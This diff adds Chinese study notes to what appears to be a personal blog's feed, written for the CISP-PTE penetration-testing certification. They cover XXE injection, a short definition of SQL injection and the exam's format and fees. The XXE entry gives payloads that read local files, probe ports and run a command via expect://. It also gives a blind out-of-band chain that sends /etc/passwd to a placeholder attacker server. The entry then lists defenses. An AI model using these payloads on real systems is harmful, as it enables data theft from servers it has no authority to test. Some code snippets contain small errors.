@@ -4,6 +4,93 @@
   
   
   <entry>
+    <title>[cisp-pte] 学习-xml实体注入</title>
+    <link href="/2022/10/11/%5Bcisp-pte%5D%20xml%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/"/>
+    <url>/2022/10/11/%5Bcisp-pte%5D%20xml%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/</url>
+    
+    <content type="html"><![CDATA[<h1 id="xml实体注入"><a href="#xml实体注入" class="headerlink" title="xml实体注入"></a>xml实体注入</h1><p>XXE，即XML外部实体注入，由于程序在解析输入的XML数据时，解析了攻击者伪造的外部实体而产生的。</p><p>XXE危害：</p><ol><li>读取任意文件</li><li>执行系统命令，但需要<code>expect</code>插件</li><li>扫描网站的端口以及是否存在某些文件或目录</li><li>通过HTTP协议发起SSRF攻击</li></ol><h2 id="XML定义"><a href="#XML定义" class="headerlink" title="XML定义"></a>XML定义</h2><p>XML是可扩展标记语言，其文档结构包括：</p><ul><li>XML文档声明</li><li>XML文档类型定义（DTD），XXE漏洞所在位置</li><li>XML文档元素</li></ul><p>一个例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;<br> &lt;!DOCTYPE root[<br> &lt;!ELEMENT A   &quot;i&quot;&gt;<br> &lt;!ELEMENT B   &quot;am&quot;&gt;<br> &lt;!ELEMENT C   &quot;hacker&quot;&gt;<br> ]&gt;<br> &lt;root&gt;<br>     &lt;A&gt;&amp;A;&lt;/A&gt;<br>     &lt;B&gt;&amp;B;&lt;/B&gt;<br>     &lt;C&gt;&amp;C;&lt;/C&gt;<br> &lt;/root&gt;<br> <br></code></pre></td></tr></table></figure><p>还有一个例子</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!-- 文档声明 --&gt;<br>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;<br>&lt;!-- 文档类型定义 --&gt;<br>&lt;!DOCTYPE note[                           &lt;!--定义此文档为note类型--&gt;<br>&lt;!ELEMENT note (to,from,heading,body)&gt;&lt;!--定义note有四个元素--&gt;<br>&lt;!ELEMENT to   (#PCDATA)&gt;<br>&lt;!ELEMENT from   (#PCDATA)&gt;<br>&lt;!ELEMENT heading   (#PCDATA)&gt;<br>&lt;!ELEMENT body   (#PCDATA)&gt;           &lt;!--定义元素的类型为#PCDATA--&gt;<br>]&gt;<br>&lt;!-- 文档元素 --&gt;<br>&lt;note&gt;<br>&lt;to&gt;Alice&lt;/to&gt;<br>&lt;from&gt;Bob&lt;/from&gt;<br>&lt;heading&gt;Reminder&lt;/heading&gt;<br>&lt;body&gt;I miss you !&lt;/body&gt;<br>&lt;/note&gt;<br></code></pre></td></tr></table></figure><h2 id="DTD结构"><a href="#DTD结构" class="headerlink" title="DTD结构"></a>DTD结构</h2><p>DTD包括以下几种定义：</p><ul><li>元素类型声明<code>&lt;!ELEMENT&gt;</code></li><li>属性表声明<code>&lt;!ATTLIST&gt;</code></li><li>实体声明<code>&lt;!ENTITY&gt;</code></li><li>记号声明<code>&lt;!NOTATION&gt;</code></li></ul><p>DTD声明有两种方式：</p><ul><li>内部声明：<code>&lt;!DOCTYPE 根元素 [元素声明]&gt;</code></li><li>外部声明：<br><code>&lt;!DOCTYPE 根元素 SYSteM &quot;文件名&quot;&gt;</code><br><code>&lt;!DOCTYPE 根元素 PUBLIC &quot;public_ID&quot; &quot;文件名&quot;&gt;</code></li></ul><p>实体声明有两种方式：</p><ul><li>内部声明：<code>&lt;!ENTITY 实体名称 &quot;实体值&quot;&gt;</code></li><li>外部声明：<br><code>&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL/协议&quot;&gt;</code><br><code>&lt;!ENTITY 实体名称 PUBLIC &quot;public_ID&quot; &quot;URI&quot;&gt;</code></li></ul><p>XML在外部引用时支持的协议：</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/20190402221806316.png" alt="在这里插入图片描述"></p><h2 id="判断是否存在XXE"><a href="#判断是否存在XXE" class="headerlink" title="判断是否存在XXE"></a>判断是否存在XXE</h2><p>在<strong>输入框</strong>或URL参数中输入一些XML标签，如<code>&lt;username&gt;Hello&lt;/username&gt;</code>，如果页面回显<code>Hello</code>，则说明这个标签被后台调用，说明存在XXE。</p><p>但是有的时候，这些注入点可能不是那么明显，<strong>如一些仅适用 JSON 去访问服务的客户端</strong>。我们可以通过修改 HTTP 请求，修改 Content-Type 头部字段等方法，然后去查看<strong>响应包</strong>，查看程序是否解析了发送的内容，如果解析了，则存在 XXE 攻击漏洞。</p><p>现实中存在的大多数 XXE 漏洞都是 <code>Blind XXE</code>，即不可见的，必须采用带外通道才能查看返回信息的记录。</p><h2 id="XXE实例"><a href="#XXE实例" class="headerlink" title="XXE实例"></a>XXE实例</h2><h3 id="读取txt格式文件（file协议）"><a href="#读取txt格式文件（file协议）" class="headerlink" title="读取txt格式文件（file协议）"></a>读取txt格式文件（file协议）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;<br>&lt;!DOCTYPE a [<br>&lt;!ENTITY test SYSTEM &quot;file:///var/www/html/test.txt&quot;&gt;<br>]&gt;<br>&lt;c&gt;&amp;test;&lt;/c&gt;<br></code></pre></td></tr></table></figure><p>这里调用了一个外部实体，将本机 test.txt 文件的内容赋值给实体 test。此处造成了 XML 实体注入攻击。</p><h3 id="读取PHP格式文件（PHP协议）"><a href="#读取PHP格式文件（PHP协议）" class="headerlink" title="读取PHP格式文件（PHP协议）"></a>读取PHP格式文件（PHP协议）</h3><p>因为 PHP 中有 <code>&lt;?php ?&gt;</code>，当 XML 解析时，遇到 <code>&lt;?</code> 这类的符号时，会将 PHP 当做 XML 去解析，所以会报错，故需要将其进行 <strong>base64 编码</strong>读出。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;<br>&lt;!DOCTYPE a[<br>&lt;!ENTITY test SYSTEM &quot;php://filter/read=convert.base64-encode/resource=index.php&quot;&gt;<br>]&gt;<br>&lt;c&gt;&amp;test&lt;/c&gt;<br></code></pre></td></tr></table></figure><p>通过 PHP 协议的 filter 输出流读取 PHP，并经过 base64 编码，这样 XML 就不会去解析 PHP 中的 <code>&lt;?</code> ，就不会报错，故可以成功读出 PHP 文件的源码内容。</p><h3 id="探测端口是否开启或文件是否存在（HTTP协议）"><a href="#探测端口是否开启或文件是否存在（HTTP协议）" class="headerlink" title="探测端口是否开启或文件是否存在（HTTP协议）"></a>探测端口是否开启或文件是否存在（HTTP协议）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;<br>&lt;!DOCTYPE a[<br>&lt;!ENTITY test SYSTEM &quot;http://127.0.0.1:3306&quot;&gt;<br>]&gt;<br>&lt;c&gt;&amp;test&lt;/c&gt;<br></code></pre></td></tr></table></figure><p>根据页面返回的报错信息或内容来判断端口是否开启，可以通过 <code>BurpSuite</code> 抓包来查看。</p><p><strong>通过此方法也可以来查看目录或者文件是否存在。</strong></p><h3 id="执行命令（expect协议）"><a href="#执行命令（expect协议）" class="headerlink" title="执行命令（expect协议）"></a>执行命令（expect协议）</h3><p>若想执行协议，则需要目标主机上安装了 <code>expect</code> 插件，并且做了相关配置。条件较苛刻，所以比较少见。</p><p>同时还有一点需要注意：<strong>所执行的命令不允许含有空格</strong>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;<br>&lt;!DOCTYPE a[<br>&lt;!ENTITY test SYSTEM &quot;expect://ls&quot;&gt;<br>]&gt;<br>&lt;c&gt;&amp;test&lt;/c&gt;<br></code></pre></td></tr></table></figure><h3 id="Blind-XXE"><a href="#Blind-XXE" class="headerlink" title="Blind XXE"></a>Blind XXE</h3><p>若服务器没有回显，那么只能使用 Blind XXE 来构建一条<strong>带外数据</strong> (OOB) 通道来读取数据。</p><blockquote><p>带有 <code>%</code> 的实体是一个参数实体，只有参数实体才能在 DTD 使用，且只能在外部 DTD 中使用。</p></blockquote><p>思路是这样的：</p><ol><li><p>攻击者发送 XML 给 Web 服务器，该 XML 文件中引用了一个外部实体；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;<br>&lt;!DOCTYPE root[<br>&lt;!ENTITY % remote SYSTEM http://攻击者的服务器IP/test.xml&gt;<br>%remote;<br>]&gt;<br></code></pre></td></tr></table></figure></li><li><p>Web 服务器解析 攻击者 发送的 XML，根据 XML 向 攻击者的服务器 请求<strong>获取恶意 DTD</strong>；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!ENTITY % payload SYSTEM &quot;file:///etc/passwd&quot;&gt;<br>&lt;!ENTITY % int &quot;&lt;!ENTITY % trick SYSTEM &#x27;http://攻击者服务器 IP/%payload;&#x27;&gt;&quot;&gt;<br>%int；<br>%trick；<br></code></pre></td></tr></table></figure></li><li><p>Web 服务器获取到 恶意 DTD 后，根据其内容，带着含有 Web 服务器上的信息去访问 攻击者服务器上的 HTTP 或 FTP；</p></li><li><p>攻击者可以通过 <strong>请求日志 来查看请求的参数</strong>来获取信息。</p></li></ol><p>当 Web 服务器请求到恶意文件，并到 Web 服务器上进行解析时，会<strong>先通过 file 协议读取到 Web 服务器 (本机) 的 &#x2F;etc&#x2F;passwd 文件的内容，并赋给参数实体 %payload</strong>。</p><p>然后再<strong>使用 http 协议，携带者刚刚请求得到的 %payload 的内容作为参数，去访问 攻击者的服务器</strong>。</p><p>这样在攻击者的服务器的<strong>日志中就会留下相应的请求信息</strong>，攻击者就可以通过浏览日志来获取相应的敏感信息。</p><h2 id="XXE防御方法"><a href="#XXE防御方法" class="headerlink" title="XXE防御方法"></a>XXE防御方法</h2><h3 id="禁用外部实体"><a href="#禁用外部实体" class="headerlink" title="禁用外部实体"></a>禁用外部实体</h3><p>不同的语言有不同的禁用方式：</p><ol><li><p>PHP</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">true</span>);<br></code></pre></td></tr></table></figure></li><li><p>JAVA</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">DocumentBuilderFactory</span> <span class="hljs-variable">dbf</span> <span class="hljs-operator">=</span> DocumentBuilderFactory.newInstance();<br>dbf.setExpandEntityReferences(<span class="hljs-literal">false</span>);<br></code></pre></td></tr></table></figure></li><li><p>Python</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> lxml <span class="hljs-keyword">import</span> etree:<br>xmlData = etree.parse(xmlSource, etree.XMLParser(resolve_entities = FALSE))<br></code></pre></td></tr></table></figure></li></ol><h3 id="过滤用户提交的XML数据"><a href="#过滤用户提交的XML数据" class="headerlink" title="过滤用户提交的XML数据"></a>过滤用户提交的XML数据</h3><p>可以过滤一些关键字，如：**&lt;!DOCTYPE&gt;、&lt;!ENTITY&gt;、SYSTEM、PUBLIC** 等。</p><h3 id="不允许-XML-含有自己定义的-DTD"><a href="#不允许-XML-含有自己定义的-DTD" class="headerlink" title="不允许 XML 含有自己定义的 DTD"></a>不允许 XML 含有自己定义的 DTD</h3>]]></content>
+    
+    
+    <categories>
+      
+      <category>渗透测试</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>渗透测试</tag>
+      
+      <tag>cisp-pte</tag>
+      
+      <tag>xml实体注入</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>[cisp-pte] 学习-sql注入</title>
+    <link href="/2022/10/10/%5Bcisp-pte%5D%20sql%E6%B3%A8%E5%85%A5/"/>
+    <url>/2022/10/10/%5Bcisp-pte%5D%20sql%E6%B3%A8%E5%85%A5/</url>
+    
+    <content type="html"><![CDATA[<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p>SQL 注入（SQL Injection）是发生在 Web 程序中数据库层的安全漏洞，是网站存在最多也是最简单的漏洞。主要原因是程序对用户输入数据的合法性没有判断和处理，导致攻击者可以在 Web 应用程序中事先定义好的 SQL 语句中添加额外的 SQL 语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步获取到数据信息。</p><p>简而言之，SQL 注入就是在用户输入的字符串中加入 SQL 语句，如果在设计不良的程序中忽略了检查，那么这些注入进去的 SQL 语句就会被数据库服务器误认为是正常的 SQL 语句而运行，攻击者就可以执行计划外的命令或访问未被授权的数据。</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>渗透测试</category>
+      
+      <category>sql注入</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>渗透测试</tag>
+      
+      <tag>cisp-pte</tag>
+      
+      <tag>sql注入</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>[cisp-pte] cisp-pte介绍</title>
+    <link href="/2022/10/10/%5Bcisp-pte%5D%20cisp-pte%E4%BB%8B%E7%BB%8D/"/>
+    <url>/2022/10/10/%5Bcisp-pte%5D%20cisp-pte%E4%BB%8B%E7%BB%8D/</url>
+    
+    <content type="html"><![CDATA[<h1 id="cisp-pte介绍"><a href="#cisp-pte介绍" class="headerlink" title="cisp-pte介绍"></a>cisp-pte介绍</h1><p><strong>注册信息安全专业人员-渗透测试工程师&#x2F;专家（CISP-PTE&#x2F;PTS）培训</strong>是由中国信息安全测评中心和CISP攻防领域考试中心统一管理和规范的信息安全专业培训，是国内最为主流及被业界认可的攻防领域渗透测试方向的专业资质培训。CISP-PTE&#x2F;PTS目前是国内唯一针对网络安全渗透测试专业人才的资格认证，也是国家对信息安全人员资质的最高认可。</p><blockquote><p>来源：<a href="https://www.uvsec.com/certification/cnitsec/3.html">注册渗透测试工程师&#x2F;专家（CISP-PTE&#x2F;PTS）认证-中国信息安全测评中心-CNITSEC-成都中科至善信息技术有限公司 (uvsec.com)</a></p></blockquote><h2 id="认证内容"><a href="#认证内容" class="headerlink" title="认证内容"></a>认证内容</h2><p>在整个CISP-PTE&#x2F;PTS知识体系结构中，共包括 web 安全、中间件安全、操作系统安全、数据库安全，渗透测试五个知识类，每个知识类根据其逻辑划分为多个知识体，每个知识体包含多个知识域，每个知识域由一个或多个知识子域组成。</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221010204342223.png" alt="image-20221010204342223"></p><p>注册渗透测试认证知识体系结构共包含五个知识类，分别为：</p><p>1、<strong>web安全基础</strong>：主要包括HTTP协议、注入漏洞、XSS漏洞、SSRF漏洞、 CSRF 漏洞、文件处理漏洞、访问控制漏洞、会话管理漏洞等相关的技术知识和实践。<br>2、<strong>中间件安全基础</strong>：主要包括Apache、IIS、Tomcat、weblogic、websphere、 Jboss 等相关的技术知识和实践。<br>3、<strong>操作系统安全基础</strong>：主要包括Windows操作系统、Linux操作系统相关技术知识和实践。<br>4、数据库安全基础：主要包括Mssql数据库、Mysql数据库、Oracle数据库、Redis 数据库相关技术知识和实践。<br>5、<strong>渗透测试</strong>：主要包括信息收集，漏洞发现，漏洞利用相关技术知识和实践。</p><p><strong>CISP渗透测试培训内容（其中红色字体为CISP-PTS需要掌握的知识）</strong></p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221010204912031.png" alt="image-20221010204912031"></p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221010205026356.png" alt="image-20221010205026356"></p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221010205044628.png" alt="image-20221010205044628"></p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221010205101174.png" alt="image-20221010205101174"></p><h2 id="考试形式"><a href="#考试形式" class="headerlink" title="考试形式"></a>考试形式</h2><p>1、<strong>CISP-PTE</strong>考试题型为客观题、实操题，客观题为单项选择题，共20题，每题1分；实操题8道，共80分。总分100分，得分70分以上（含70分）为通过。</p><p>2、<strong>CISP-PTS</strong>考试题型为实操题，共10题，每题10分，总分100分，得分70分以上（含70分）为通过。</p><table><thead><tr><th><strong>渗透测试知识类别</strong></th><th><strong>CISP-PTE分值占比</strong></th><th><strong>CISP-PTS分值占比</strong></th></tr></thead><tbody><tr><td>Web安全</td><td>50%</td><td>30%</td></tr><tr><td>操作系统与中间件</td><td>20%</td><td>30%</td></tr><tr><td>数据与日志分析</td><td>10%</td><td>10%</td></tr><tr><td>渗透测试</td><td>20%</td><td>30%</td></tr></tbody></table><h2 id="考试要求"><a href="#考试要求" class="headerlink" title="考试要求"></a>考试要求</h2><p>成为注册信息安全专业人员-渗透测试工程师&#x2F;专家（CISP-PTE&#x2F;PTS）,必须同时满足以下基本要求：</p><p>1、CISP-PTE&#x2F;PTS报考人员需具备一定渗透测试能力，或有意向从事渗透测试，包含信息安全相关专业高校生；<br>2、CISP-PTE&#x2F;PTS无学历与工作经验的报考要求；<br>3、通过CISP攻防领域考试中心组织的CISP-PTE&#x2F;PTS考试；<br>4、同意并遵守CISP-PTE&#x2F;PTS职业准则；<br>5、满足CISP-PTE&#x2F;PTS注册要求并成功通过审核；<br>6、证书有效期三年，证书失效后，需重新参加CISP-PTE注册考试。</p><h2 id="收费标准"><a href="#收费标准" class="headerlink" title="收费标准"></a>收费标准</h2><p>1、CISP-PTE认证是全国统一收费标准，<strong>19800元&#x2F;人</strong>。</p><p> 具体收费内容包含培训费+注册费，其中培训费14800元&#x2F;人，注册考试费5000元&#x2F;人。</p><p>2、CISP-PTS认证是全国统一收费标准，<strong>27800元&#x2F;人</strong>。</p><p> 具体收费内容包含培训费+注册费，其中培训费19800元&#x2F;，注册考试费8000元&#x2F;人。</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>渗透测试</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>渗透测试</tag>
+      
+      <tag>cisp-pte</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>[java] java读写json文件</title>
     <link href="/2022/10/09/%5Bjava%5D%20java%E8%AF%BB%E5%86%99json%E6%96%87%E4%BB%B6/"/>
     <url>/2022/10/09/%5Bjava%5D%20java%E8%AF%BB%E5%86%99json%E6%96%87%E4%BB%B6/</url>
